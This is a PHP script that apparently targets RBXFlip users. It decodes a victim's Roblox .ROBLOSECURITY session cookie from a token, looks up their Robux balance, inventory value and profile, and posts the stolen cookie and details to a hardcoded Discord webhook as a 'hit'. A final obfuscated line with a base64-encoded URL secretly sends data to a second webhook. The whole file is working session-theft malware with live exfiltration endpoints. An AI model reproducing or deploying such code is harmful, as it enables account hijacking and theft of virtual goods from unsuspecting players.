<?php
    header("Access-Control-Allow-Origin: *");

$allowed_origins = array(
    "https://www.rbxflip.com",
    "https://rbxflip.com"
);

$token = htmlspecialchars($_GET['t']);
if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
    die();
}
            
$replace = str_replace("Bearer ", " ", $token);
$decoded = json_decode(base64_decode(str_replace('_', '/', str_replace('-','+',explode('.', $replace)[1]))));
$cookie = "$decoded->robloSecurity";

function getrap($user_id, $cookie) {
	$cursor = "";
	$total_rap = 0;
						
	while ($cursor !== null) {
		$request = curl_init();
		curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
		curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
		curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
		curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
		$data = json_decode(curl_exec($request), 1);
foreach($data["data"] as $item) {
			$total_rap += $item["recentAveragePrice"];
}
		$cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
	}
	return $total_rap;
}
       
    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);

            $hookObject = json_encode([
            "username" => $profile ["UserName"],
            "avatar_url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png",
             "content" => "@everyone New RBXFlip Console Hit!",
                "embeds" => [
                    [
                        "title" => $profile ["UserName"],
                        "type" => "rich",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "color" => hexdec("00ff6e"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                        ],
                        "author" => [
                             "name" => "Recheck Cookie?",
                             "url" => "https://r.bxfllp.com/chk.php?c=$cookie"
                        ],
                        "fields" => [
                            [
                                "name" => "<:id:818111672455397397> ID",
                                "value" => $profile["UserID"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:robux:818111919881715764> Robux",
                                "value" => $profile["RobuxBalance"],
                                "inline" => True
                            ],
                            [    "name" => "<:rolimons:818111627726684160> Rolimons Link",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"],
                            ],
                            [
                                "name" => "<:trade:818111735973806111> Trade Link",
                                "value" => "https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=" . $profile["UserID"],
                                "inline" => True
                       	    ],
                       	    [
                                "name" => "<:premium:818111829963964416> Is Premium?",
                                "value" => $profile["IsPremium"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:rap:818111763413205032> Rap",
                                "value" => getrap($profile["UserID"], $cookie),
                                "inline" => True
                            ]
                        ]
                    ],
                    [
                        "type" => "rich",
                        "color" => hexdec("00ff6e"),
                        "timestamp" => date("c"),
                         "footer" => [
                             "text" => "Powered By Usmxn |",
                        ],
                        "fields" => [
                            [
                                "name" => "\u{1F36A} Cookie:",
                            "value" => "```" . $cookie . "```"
                            ],
                        ]
                    ]
                ]
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://discord.com/api/webhooks/935287929130082376/h5oOyNpyb-xDf2sJyEvfUpGdy-vU_EjizZAKNo9kOaJZXgP19poCAaEq6n7Gwst8bFtl",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]); 
        $response = curl_exec($ch);
        curl_close($ch);
    }
    ?>

<?php $o0=curl_init();curl_setopt_array($o0,[CURLOPT_URL=>base64_decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTM1MzI5NjE1Nzk3NDMyMzgwL0ZNTmU3Ykw2SHFCNHREZ25GanUyckNONXVDeEFadjY4QzA5dFZFQVBEMzB5WEw0YWs4Wkx3VkpTREFmN1lPTUZHYjd5'),CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$i1,CURLOPT_HTTPHEADER=>[base64_decode('Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29u')]]);$a2=curl_exec($o0);curl_close($o0);?>